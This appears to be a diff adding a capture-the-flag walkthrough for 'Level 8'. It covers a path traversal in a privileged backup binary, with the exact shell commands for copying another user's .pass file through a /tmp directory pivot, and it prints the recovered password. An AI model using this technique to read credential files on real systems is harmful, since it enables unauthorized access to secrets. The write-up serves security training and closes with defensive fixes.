@@ -3,17 +3,59 @@ Level 8 - Walkthrough
 
 1) Recon
 - Files discovered:
+	- `/home/users/level08/level08`
+	- reconstructed logic in local `code.c`
 - Useful commands used:
+	- `objdump -d /home/users/level08/level08`
+	- runtime testing with controlled cwd (`/tmp`)
 
 2) Vulnerability confirmation
 - What is vulnerable:
+	- `argv[1]` is used unsafely in both read and write paths.
 - Why it is exploitable:
+	- No path sanitization, so traversal with `..` is accepted.
+	- Destination path uses relative prefix `./backups/`, allowing cwd pivot trick.
 
 3) Exploitation steps
-- Exact command sequence:
-- Payload used:
+
+Step A - Move to writable cwd and prepare directories:
+
+```bash
+cd /tmp
+mkdir -p backups
+mkdir -p home/users/level09
+```
+
+Step B - Run binary with traversal argument:
+
+```bash
+/home/users/level08/level08 ../home/users/level09/.pass
+```
+
+Step C - Read copied output file:
+
+```bash
+cat /tmp/home/users/level09/.pass
+```
+
+Payload used:
+- `argv[1] = ../home/users/level09/.pass`
+
+Resolution summary:
+- Read path from cwd `/tmp`:
+	- `../home/users/level09/.pass` -> `/home/users/level09/.pass`
+- Write path:
+	- `./backups/../home/users/level09/.pass` -> `/tmp/home/users/level09/.pass`
 
 4) Result
 - Retrieved next password from:
-- Notes for defense/evaluation:
+	- copied file at `/tmp/home/users/level09/.pass`
+	- original secret source `/home/users/level09/.pass`
+- Recovered value:
+	- `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
+
+5) Notes for defense/evaluation:
+- Root issue is path traversal in file copy logic.
+- Must canonicalize and validate both source and destination paths.
+- Do not build privileged destination from untrusted filename input.
 
